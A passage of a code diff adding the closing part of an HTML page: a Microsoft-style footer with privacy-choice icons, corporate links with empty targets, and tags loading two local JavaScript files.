+                              d="M24.6 4c.2.2.2.6 0 .8L22.5 7l2.2 2.2c.2.2.2.6 0 .8-.2.2-.6.2-.8 0l-2.2-2.2-2.2 2.2c-.2.2-.6.2-.8 0-.2-.2-.2-.6 0-.8L20.8 7l-2.2-2.2c-.2-.2-.2-.6 0-.8.2-.2.6-.2.8 0l2.2 2.2L23.8 4c.2-.2.6-.2.8 0z"
+                              style="fill: #fff"
+                            ></path>
+                            <path
+                              d="M12.7 4.1c.2.2.3.6.1.8L8.6 9.8c-.1.1-.2.2-.3.2-.2.1-.5.1-.7-.1L5.4 7.7c-.2-.2-.2-.6 0-.8.2-.2.6-.2.8 0L8 8.6l3.8-4.5c.2-.2.6-.2.9 0z"
+                              style="fill: #06f"
+                            ></path>
+                          </svg>
+                          <span>Your Privacy Choices</span>
+                        </a>
+
+                        <noscript>
+                          <a href="" class="c-uhff-link c-uhff-ccpa">
+                            <svg
+                              role="img"
+                              xmlns="http://www.w3.org/2000/svg"
+                              viewBox="0 0 30 14"
+                              xml:space="preserve"
+                              height="16"
+                              width="43"
+                            >
+                              <title>Your Privacy Choices Opt-Out Icon</title>
+                              <path
+                                d="M7.4 12.8h6.8l3.1-11.6H7.4C4.2 1.2 1.6 3.8 1.6 7s2.6 5.8 5.8 5.8z"
+                                style="
+                                  fill-rule: evenodd;
+                                  clip-rule: evenodd;
+                                  fill: #fff;
+                                "
+                              />
+                              <path
+                                d="M22.6 0H7.4c-3.9 0-7 3.1-7 7s3.1 7 7 7h15.2c3.9 0 7-3.1 7-7s-3.2-7-7-7zm-21 7c0-3.2 2.6-5.8 5.8-5.8h9.9l-3.1 11.6H7.4c-3.2 0-5.8-2.6-5.8-5.8z"
+                                style="
+                                  fill-rule: evenodd;
+                                  clip-rule: evenodd;
+                                  fill: #06f;
+                                "
+                              />
+                              <path
+                                d="M24.6 4c.2.2.2.6 0 .8L22.5 7l2.2 2.2c.2.2.2.6 0 .8-.2.2-.6.2-.8 0l-2.2-2.2-2.2 2.2c-.2.2-.6.2-.8 0-.2-.2-.2-.6 0-.8L20.8 7l-2.2-2.2c-.2-.2-.2-.6 0-.8.2-.2.6-.2.8 0l2.2 2.2L23.8 4c.2-.2.6-.2.8 0z"
+                                style="fill: #fff"
+                              />
+                              <path
+                                d="M12.7 4.1c.2.2.3.6.1.8L8.6 9.8c-.1.1-.2.2-.3.2-.2.1-.5.1-.7-.1L5.4 7.7c-.2-.2-.2-.6 0-.8.2-.2.6-.2.8 0L8 8.6l3.8-4.5c.2-.2.6-.2.9 0z"
+                                style="fill: #06f"
+                              />
+                            </svg>
+                            <span>Your Privacy Choices</span>
+                          </a>
+                        </noscript>
+                        <a href="" class="c-uhff-link c-uhff-consumer">
+                          <span>Consumer Health Privacy</span>
+                        </a>
+
+                        <nav aria-label="Microsoft corporate links">
+                          <ul class="c-list f-bare">
+                            <li id="c-uhff-footer_sitemap">
+                              <a class="c-uhff-link" href="">Sitemap</a>
+                            </li>
+                            <li id="c-uhff-footer_contactus">
+                              <a class="c-uhff-link" href=""
+                                >Contact Microsoft</a
+                              >
+                            </li>
+                            <li id="c-uhff-footer_privacyandcookies">
+                              <a class="c-uhff-link" href="">Privacy </a>
+                            </li>
+                            <li
+                              class="x-hidden"
+                              id="c-uhff-footer_managecookies"
+                            >
+                              <a class="c-uhff-link" href="">Manage cookies</a>
+                            </li>
+                            <li id="c-uhff-footer_termsofuse">
+                              <a class="c-uhff-link" href="">Terms of use</a>
+                            </li>
+                            <li id="c-uhff-footer_trademarks">
+                              <a class="c-uhff-link" href="">Trademarks</a>
+                            </li>
+                            <li id="c-uhff-footer_safetyandeco">
+                              <a class="c-uhff-link" href=""
+                                >Safety &amp; eco</a
+                              >
+                            </li>
+                            <li id="c-uhff-recycling">
+                              <a class="c-uhff-link" href="">Recycling</a>
+                            </li>
+                            <li id="c-uhff-footer_aboutourads">
+                              <a class="c-uhff-link" href="">About our ads</a>
+                            </li>
+
+                            <li>© Microsoft 2024</li>
+                          </ul>
+                        </nav>
+                      </div>
+                    </footer>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="/js/script.js"></script>
+    <script src="/js/operation.js"></script>
+  </body>
+</html>
